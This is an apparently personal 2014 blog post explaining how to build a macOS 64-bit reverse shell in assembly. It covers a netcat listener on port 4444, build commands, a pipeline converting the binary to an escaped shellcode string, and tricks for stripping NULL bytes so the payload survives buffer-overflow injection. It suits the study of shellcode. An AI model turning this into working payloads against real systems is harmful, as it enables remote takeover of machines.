---
layout: post
title: "Reverse shell"
date: 2014-05-20 20:22:22 +0200
comments: false
categories: 
---
reverse_shell
=============
My first attempt was to write a reverse shell to be used in Mac OSX 64-bit system, one of the first obstacles was to find the header file
with the id for syscalls. After some google I found an excellent page with them 
[here](http://www.opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master "syscalls"). The first steep was to write some 
c code that did the same job and from that deduce the correct order of the syscalls. This resulted in the file reverse_shell.s, 
and keep in mind that in 64-bit the calls need to be in the form, `0x2000061` for the syscall `61`. The complete code for
[reverse_shell.s](https://github.com/chrjoh/shell_code/blob/master/reverse_shell/reverse_shell.s "reverse_shell.s"). 
The [page](http://cocoafactory.com/blog/2012/11/23/x86-64-assembly-language-tutorial-part-1/)
have a good description of the registers and the naming it also include a tutorial to assembly programming. The first order of business
is to change from the nasm that apple supply, go to 
[nasm download osx](http://www.nasm.us/pub/nasm/releasebuilds/2.11.02/macosx/) and download the macox version.


#### reverse_shell, Usage:
  Program that call out to a service that is listening to port 4444, the ip is set to any for simplicity.
  It is written for mac osx 64 bit

  Start a listening server with the command: `nc -l 4444` in another folder for example your home directory
```
  nasm -g -f macho64 reverse_shell.s
  ld  -arch x86_64 -macosx_version_min 10.7.0 -lSystem -o reverse_shell reverse_shell.o
  ./reverse_shell
```  
To use the code as a string payload, one need to remove the NULL bytes, these can be found by running: otool -lV reverse_shell and identify
the mov instructions that need to be modified. The reason are the numerous NULL bytes (\x00). 
Most buffer overflow errors are related to C stdlib string functions: strcpy(), sprintf(), strcat(), 
and so on. All of these functions use the NULL symbol to indicate the end of a string. 
Therefore, a function will not read shellcode after the first occurring NULL byte.
There are other delimiters like linefeed (0x0A), carriage return (0x0D), 0xFF, and others.

#### Binary to string
To convert the binary to string values that can be used as a payload use
```
  gobjdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g' > dump.txt
```
  By inspecting this file, we see quite few NULL(0x00) and these has to be removed
  A simple `paste -d'\0' -s dump.txt` will combine all rows into one that can then be copied into the C file.
  Ànother way to find bad values is:
```
 gobjdump -D reverse_shell -M intel |grep 00
``` 

By using the above and to find the problematic instructions and that most of them include the `mov` instruction and that the data we move
is stored in the lowest byte of the 64-bit registers. We can use `mov dil, 2` instead of `mov rdi, 2`. Using this and that we can construct
the syscall setuid `mov rax, 0x2000017` by using the following instructions 
```
 mov r8b, 0x02               ; unix class system calls = 2
 shl r8, 24                  ; shift left 24 to the upper order bits
 or r8, 0x17                 ; setreuid is 0x17
 mov rax, r8                 ; put setreuid syscall # into rax
```
The last part is now to get rid of the NULL terminated string `db '/bin/sh', 0` this we do by using a simple ruby command
(remember that osx is little endian)

```
  "/bin//sh".unpack('H*')
  => ["2f62696e2f2f7368"] and that give us the value to use as: 0x68732f2f6e69622f
```
The result of doing these manipulations can be found in 
[reverse_shell_no_bad_values.s](https://github.com/chrjoh/shell_code/blob/master/reverse_shell/reverse_shell_no_bad_values.s "reverse_shell_no_bad_values.s")
A more simple command to use is the osx otool, `otool -t reverse_shell_no_bad_values.o` to generate the hex values we need to be able to 
test our reverse_shell code in a simple c-program, 
[reverse_shell_test.c](https://github.com/chrjoh/shell_code/blob/master/reverse_shell/reverse_shell_test.c "reverse_shell_test.c").
Start your netcat server `nc -l 4444` then run the c code and it should call out to you can check that it works by doing some normal
shell commands. To simplify the compilation you can use the supplied Makefile.
